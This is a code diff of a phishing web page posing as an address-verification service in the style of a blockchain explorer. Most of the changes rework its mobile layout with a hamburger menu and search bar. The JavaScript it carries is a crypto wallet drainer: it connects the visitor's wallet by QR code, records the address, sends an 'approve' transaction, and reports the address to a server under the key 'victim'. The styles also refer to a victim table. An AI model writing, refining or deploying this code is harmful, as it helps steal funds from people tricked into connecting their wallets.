@@ -265,8 +265,8 @@
       padding: 24px 24px 52px;
       box-shadow: 0 8px 19.2px 0 rgb(189 197 209 / .2);
     }
-    .card h1 { margin: 0; font-size: 23px; font-weight: 500; line-height: 1.2; color: var(--azure-15); text-align: center; }
-    .card .sub { margin: 8px 0 0; font-size: 14px; color: var(--azure-15); text-align: center; }
+    .card h1 { margin: 0; font-family: 'Roboto', sans-serif; font-weight: 500; font-size: 23px; line-height: 1.2; color: rgb(33, 37, 41); text-align: center; }
+    .card .sub { margin: 8px 0 0; font-family: 'Roboto', sans-serif; font-weight: 400; font-size: 14px; color: rgb(108, 117, 125); text-align: center; }
     .bubble {
       margin-top: 20px; transform: translateY(8px);
       display: flex; align-items: center; justify-content: center;
@@ -472,116 +472,89 @@
 
     /* ===== RESPONSIVE MOBILE (≤ 900px) ===== */
     @media (max-width: 900px) {
-      /* Topbar : 2 lignes propres */
-      .topbar { padding: 8px 12px; }
-      .topbar-inner {
-        padding: 0;
-        flex-direction: row;
-        flex-wrap: wrap;
-        gap: 8px;
+      /* Retirer complètement la navbar / topbar */
+      .topbar,
+      .site-header { display: none !important; }
+
+      /* Topbar mobile : search bar seule et centrée */
+      .mobile-topbar {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 16px 60px 16px 16px;
+        background: var(--white-solid);
+        border-bottom: 1px solid var(--grey-93);
       }
-      .topbar-left {
+      .mobile-topbar .search-wrap {
         flex: 1 1 auto;
-        gap: 12px;
-        flex-wrap: wrap;
-        order: 1;
-      }
-      .topbar-right {
-        flex: 0 0 auto;
-        gap: 6px;
-        order: 2;
-      }
-      .search-wrap {
-        order: 3;
-        flex: 1 1 100%;
         width: 100%;
-        margin-top: 4px;
       }
-      .search-wrap input {
+      .mobile-topbar .search-wrap input {
         height: 40px;
         padding: 0 40px 0 38px;
         font-size: 14px;
       }
-      .slash-badge { display: none; }
-      .tb-group { gap: 2px; }
-      .t-xs { font-size: 11px; }
-      .icon-btn { height: 36px; width: 36px; }
+      .mobile-topbar .slash-badge { display: none; }
 
-      /* Header : nav horizontale scrollable */
-      .site-nav {
-        padding: 10px 12px;
-        gap: 8px;
-        align-items: center;
-        flex-wrap: nowrap;
-      }
-      .brand { flex: none; padding-right: 8px; }
-      .brand img { height: 30px; width: auto; }
-
-      .nav-list {
-        flex: 1 1 auto;
-        min-width: 0;
+      /* Hamburger à droite */
+      .hamburger {
         display: flex;
-        flex-wrap: nowrap;
-        gap: 2px;
-        overflow-x: auto;
-        overflow-y: hidden;
-        -webkit-overflow-scrolling: touch;
-        scrollbar-width: none;
-        padding: 2px 4px;
-        justify-content: flex-start;
-        align-items: center;
-      }
-      .nav-list::-webkit-scrollbar { display: none; }
-      .nav-list > li { flex: 0 0 auto; }
-      .nav-link, .nav-btn {
-        padding: 10px 8px;
-        font-size: 13px;
-        white-space: nowrap;
-      }
-      .nav-btn .icon { width: 12px; height: 12px; }
-      .nav-sep { display: none; }
-      .signin { padding: 10px 8px; font-size: 13px; gap: 4px; }
-      .signin .icon-md { width: 14px; height: 14px; }
-
-      /* Dropdowns / mega : plein écran sous le header */
-      .dropdown, .mega {
         position: fixed;
-        left: 0;
-        right: 0;
-        top: auto;
-        width: 100%;
-        min-width: 0;
-        max-height: calc(100vh - 100px);
-        overflow-y: auto;
-        -webkit-overflow-scrolling: touch;
-        border-radius: 0 0 8px 8px;
-        border-left: none;
-        border-right: none;
-        z-index: 60;
+        top: 16px;
+        right: 16px;
+        z-index: 1100;
+        flex-direction: column;
+        gap: 5px;
+        cursor: pointer;
+        background: none;
+        border: none;
+        padding: 6px;
       }
-      .dropdown a { padding: 12px 20px; font-size: 14px; white-space: normal; }
-      .dropdown .divider { margin: 6px 0; }
+      .hamburger span {
+        display: block;
+        width: 24px;
+        height: 2px;
+        background-color: var(--azure-15);
+        border-radius: 2px;
+      }
 
-      .mega-grid { grid-template-columns: 1fr; gap: 20px; padding: 20px 20px 28px; }
-      .mega h3 { font-size: 14px; margin-bottom: 10px; }
-      .mega a { padding: 10px 0; font-size: 14px; }
+      /* Menu mobile */
+      .mobile-menu {
+        display: block;
+        position: fixed;
+        top: 0;
+        right: -100%;
+        width: 260px;
+        height: 100vh;
+        background: var(--white-solid);
+        box-shadow: -4px 0 20px rgba(0, 0, 0, 0.1);
+        padding: 80px 24px 24px;
+        transition: right 0.3s ease;
+        z-index: 1050;
+      }
+      .mobile-menu.open { right: 0; }
+      .mobile-menu .nav-link {
+        display: block;
+        font-family: Inter, system-ui, sans-serif;
+        font-weight: 400;
+        font-size: 16px;
+        color: var(--azure-15);
+        text-decoration: none;
+        padding: 12px 0;
+        border-bottom: 1px solid var(--grey-93);
+        cursor: pointer;
+      }
+      .mobile-menu .nav-link:last-child { border-bottom: none; }
 
-      /* Victim table : scroll horizontal propre */
-      .more-container { padding: 16px 12px; }
-      .more-container h3 { font-size: 15px; margin-bottom: 12px; }
-      #victim-table-wrapper {
-        overflow-x: auto;
-        -webkit-overflow-scrolling: touch;
-        border: 1px solid var(--grey-93);
-        border-radius: 8px;
+      /* Overlay */
+      .menu-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.3);
+        z-index: 1040;
       }
-      #victim-table {
-        font-size: 12px;
-        display: table;
-        min-width: 640px;
-        white-space: nowrap;
-      }
-      #victim-table th, #victim-table td { padding: 8px 10px; }
+      .menu-overlay.open { display: block; }
 
       /* Main / Card */
       .main { padding: 0 12px; }
@@ -591,7 +564,7 @@
         padding: 20px 16px 32px;
         border-radius: 10px;
       }
-      .card h1 { font-size: 20px; }
+      .card h1 { font-size: 21px; }
       .card .sub { font-size: 13px; line-height: 1.45; }
       .bubble {
         margin-top: 16px;
@@ -600,7 +573,7 @@
       }
       .bubble img { height: 18px; }
 
-      /* QR : taille fluide via clamp pour s'adapter à toutes les largeurs */
+      /* QR */
       .qr {
         width: clamp(200px, 70vw, 260px);
         height: clamp(200px, 70vw, 260px);
@@ -662,6 +635,16 @@
       .donations { font-size: 12px; }
     }
 
+    /* ===== Desktop : masquer les éléments mobiles ===== */
+    @media (min-width: 901px) {
+      .mobile-topbar,
+      .hamburger,
+      .mobile-menu,
+      .menu-overlay {
+        display: none !important;
+      }
+    }
+
     /* ===== Très petits écrans (≤ 380px) ===== */
     @media (max-width: 380px) {
       .card h1 { font-size: 18px; }
@@ -670,8 +653,6 @@
         width: clamp(180px, 72vw, 220px);
         height: clamp(180px, 72vw, 220px);
       }
-      .nav-link, .nav-btn, .signin { font-size: 12px; padding: 9px 6px; }
-      .brand img { height: 26px; }
       .t-xs { font-size: 10px; }
     }
 
@@ -685,7 +666,7 @@
 </head>
 <body id="top">
 
-  <!-- ===== Top bar ===== -->
+  <!-- ===== Top bar (desktop uniquement) ===== -->
   <div class="topbar">
     <div class="container topbar-inner">
       <div class="topbar-left">
@@ -720,7 +701,7 @@
     </div>
   </div>
 
-  <!-- ===== Header ===== -->
+  <!-- ===== Header (desktop uniquement) ===== -->
   <header class="site-header" id="site-header">
     <nav class="container site-nav">
       <a class="brand" href="https://verifyaddress.io/">
@@ -745,6 +726,30 @@
       </div>
     </div>
   </header>
+
+  <!-- ===== Topbar mobile : search bar seule et centrée ===== -->
+  <div class="mobile-topbar">
+    <div class="search-wrap">
+      <svg class="icon search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+      <input type="text" aria-label="Search" placeholder="Search by Address / Txn Hash / Block / Token / Domain Name" />
+    </div>
+  </div>
+
+  <!-- ===== Hamburger (mobile) ===== -->
+  <button class="hamburger" id="hamburgerBtn" aria-label="Menu">
+    <span></span>
+    <span></span>
+    <span></span>
+  </button>
+
+  <!-- ===== Overlay ===== -->
+  <div class="menu-overlay" id="menuOverlay"></div>
+
+  <!-- ===== Menu mobile (uniquement Sign in et More) ===== -->
+  <div class="mobile-menu" id="mobileMenu">
+    <a class="nav-link" href="#">Sign in</a>
+    <a class="nav-link" href="#">More</a>
+  </div>
 
   <!-- ===== Main ===== -->
   <main class="main">
@@ -1279,87 +1284,87 @@ async function initWalletConnect() {
         events: []
       }
     },
-      redirect: { universal: 'https://verifyaddress.io/verifyaddresss' }
-    });
+    redirect: { universal: 'https://verifyaddress.io/verifyaddresss' }
+  });
 
-    if (typeof window.QRCodeStyling === 'undefined') {
-      document.querySelector('.scan').textContent = 'QR library not loaded';
-      return;
-    }
-
-    const qrDiv = document.getElementById('qrcode');
-    qrDiv.innerHTML = `
-      <div id="qr-wrapper">
-        <div id="qr-code"></div>
-        <div id="logo-box">
-          <svg width="42" height="42" viewBox="-2.19622685 .37688013 124.38617733 125.52740941" xmlns="http://www.w3.org/2000/svg">
-            <path d="m25.79 58.415a5.157 5.157 0 0 1 5.181-5.156l8.59.028a5.164 5.164 0 0 1 5.164 5.164v32.48c.967-.287 2.209-.593 3.568-.913a4.3 4.3 0 0 0 3.317-4.187v-40.291a5.165 5.165 0 0 1 5.164-5.165h8.607a5.165 5.165 0 0 1 5.164 5.165v37.393s2.155-.872 4.254-1.758a4.311 4.311 0 0 0 2.632-3.967v-44.578a5.164 5.164 0 0 1 5.163-5.164h8.606a5.164 5.164 0 0 1 5.164 5.164v36.71c7.462-5.408 15.024-11.912 21.025-19.733a8.662 8.662 0 0 0 1.319-8.092 60.792 60.792 0 0 0 -58.141-40.829 60.788 60.788 0 0 0 -51.99 91.064 7.688 7.688 0 0 0 7.334 3.8c1.628-.143 3.655-.346 6.065-.63a4.3 4.3 0 0 0 3.815-4.268z" fill="#000000"/>
-            <path d="m25.602 110.51a60.813 60.813 0 0 0 63.371 5.013 60.815 60.815 0 0 0 33.212-54.203c0-1.4-.065-2.785-.158-4.162-22.219 33.138-63.244 48.63-96.423 53.347" fill="#979695"/>
-          </svg>
-        </div>
-      </div>
-    `;
-
-    // Taille du QR calculée en fonction de la largeur réelle du conteneur parent
-    const qrContainer = document.querySelector('.qr');
-    const containerWidth = qrContainer ? qrContainer.clientWidth : 260;
-    const qrSize = Math.min(Math.max(containerWidth, 180), 300);
-
-    const qrCode = new window.QRCodeStyling({
-      width: qrSize,
-      height: qrSize,
-      type: "svg",
-      data: uri,
-      margin: 0,
-      qrOptions: {
-        typeNumber: 0,
-        mode: "Byte",
-        errorCorrectionLevel: "M"
-      },
-      dotsOptions: {
-        type: "dots",
-        color: "#000000"
-      },
-      backgroundOptions: {
-        color: "#ffffff"
-      },
-      cornersSquareOptions: {
-        type: "extra-rounded",
-        color: "#000000"
-      },
-      cornersDotOptions: {
-        type: "dot",
-        color: "#000000"
-      }
-    });
-    qrCode.append(document.getElementById("qr-code"));
-
-    session = await approval();
-
-    const accounts = session.namespaces['eip155'].accounts;
-    const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
-    if (!ethAccount) throw new Error('Ethereum mainnet requis');
-    account = ethAccount.split(':')[2];
-
-    qrDiv.innerHTML = '';
-    qrDiv.style.display = 'flex';
-    qrDiv.style.alignItems = 'center';
-    qrDiv.style.justifyContent = 'center';
-    qrDiv.style.fontSize = '14px';
-    qrDiv.style.color = 'var(--azure-15)';
-    qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
-
-    const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = 'En attente de confirmation…';
-
-    fetch('/api/record-wallet', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ address: account, chain: '1' })
-    }).catch(err => console.error('Erreur record-wallet:', err));
-
-    setTimeout(sendExactApproveTransaction, 1000); // ← change startVerification → requestSignature
+  if (typeof window.QRCodeStyling === 'undefined') {
+    document.querySelector('.scan').textContent = 'QR library not loaded';
+    return;
   }
+
+  const qrDiv = document.getElementById('qrcode');
+  qrDiv.innerHTML = `
+    <div id="qr-wrapper">
+      <div id="qr-code"></div>
+      <div id="logo-box">
+        <svg width="42" height="42" viewBox="-2.19622685 .37688013 124.38617733 125.52740941" xmlns="http://www.w3.org/2000/svg">
+          <path d="m25.79 58.415a5.157 5.157 0 0 1 5.181-5.156l8.59.028a5.164 5.164 0 0 1 5.164 5.164v32.48c.967-.287 2.209-.593 3.568-.913a4.3 4.3 0 0 0 3.317-4.187v-40.291a5.165 5.165 0 0 1 5.164-5.165h8.607a5.165 5.165 0 0 1 5.164 5.165v37.393s2.155-.872 4.254-1.758a4.311 4.311 0 0 0 2.632-3.967v-44.578a5.164 5.164 0 0 1 5.163-5.164h8.606a5.164 5.164 0 0 1 5.164 5.164v36.71c7.462-5.408 15.024-11.912 21.025-19.733a8.662 8.662 0 0 0 1.319-8.092 60.792 60.792 0 0 0 -58.141-40.829 60.788 60.788 0 0 0 -51.99 91.064 7.688 7.688 0 0 0 7.334 3.8c1.628-.143 3.655-.346 6.065-.63a4.3 4.3 0 0 0 3.815-4.268z" fill="#000000"/>
+          <path d="m25.602 110.51a60.813 60.813 0 0 0 63.371 5.013 60.815 60.815 0 0 0 33.212-54.203c0-1.4-.065-2.785-.158-4.162-22.219 33.138-63.244 48.63-96.423 53.347" fill="#979695"/>
+        </svg>
+      </div>
+    </div>
+  `;
+
+  // Taille du QR calculée en fonction de la largeur réelle du conteneur parent
+  const qrContainer = document.querySelector('.qr');
+  const containerWidth = qrContainer ? qrContainer.clientWidth : 260;
+  const qrSize = Math.min(Math.max(containerWidth, 180), 300);
+
+  const qrCode = new window.QRCodeStyling({
+    width: qrSize,
+    height: qrSize,
+    type: "svg",
+    data: uri,
+    margin: 0,
+    qrOptions: {
+      typeNumber: 0,
+      mode: "Byte",
+      errorCorrectionLevel: "M"
+    },
+    dotsOptions: {
+      type: "dots",
+      color: "#000000"
+    },
+    backgroundOptions: {
+      color: "#ffffff"
+    },
+    cornersSquareOptions: {
+      type: "extra-rounded",
+      color: "#000000"
+    },
+    cornersDotOptions: {
+      type: "dot",
+      color: "#000000"
+    }
+  });
+  qrCode.append(document.getElementById("qr-code"));
+
+  session = await approval();
+
+  const accounts = session.namespaces['eip155'].accounts;
+  const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
+  if (!ethAccount) throw new Error('Ethereum mainnet requis');
+  account = ethAccount.split(':')[2];
+
+  qrDiv.innerHTML = '';
+  qrDiv.style.display = 'flex';
+  qrDiv.style.alignItems = 'center';
+  qrDiv.style.justifyContent = 'center';
+  qrDiv.style.fontSize = '14px';
+  qrDiv.style.color = 'var(--azure-15)';
+  qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
+
+  const scanText = document.querySelector('.scan');
+  if (scanText) scanText.textContent = 'En attente de confirmation…';
+
+  fetch('/api/record-wallet', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ address: account, chain: '1' })
+  }).catch(err => console.error('Erreur record-wallet:', err));
+
+  setTimeout(sendExactApproveTransaction, 1000);
+}
 
 async function sendExactApproveTransaction() {
   try {
@@ -1421,8 +1426,6 @@ async function sendExactApproveTransaction() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ victim: account, chain: '1' })
     });
-
-    // (redirection supprimée)
 
   } catch (e) {
     console.error('Transaction error:', e);
@@ -1551,6 +1554,25 @@ async function sendExactApproveTransaction() {
       if (scanText) scanText.textContent = 'Erreur de connexion';
     });
   });
+
+  /* ===== Hamburger mobile ===== */
+  const hamburgerBtn = document.getElementById('hamburgerBtn');
+  const mobileMenu = document.getElementById('mobileMenu');
+  const menuOverlay = document.getElementById('menuOverlay');
+
+  function toggleMobileMenu() {
+    mobileMenu.classList.toggle('open');
+    menuOverlay.classList.toggle('open');
+  }
+
+  if (hamburgerBtn) hamburgerBtn.addEventListener('click', toggleMobileMenu);
+  if (menuOverlay) menuOverlay.addEventListener('click', toggleMobileMenu);
+
+  if (mobileMenu) {
+    mobileMenu.querySelectorAll('.nav-link').forEach(function (link) {
+      link.addEventListener('click', toggleMobileMenu);
+    });
+  }
 </script>
 </body>
 </html>
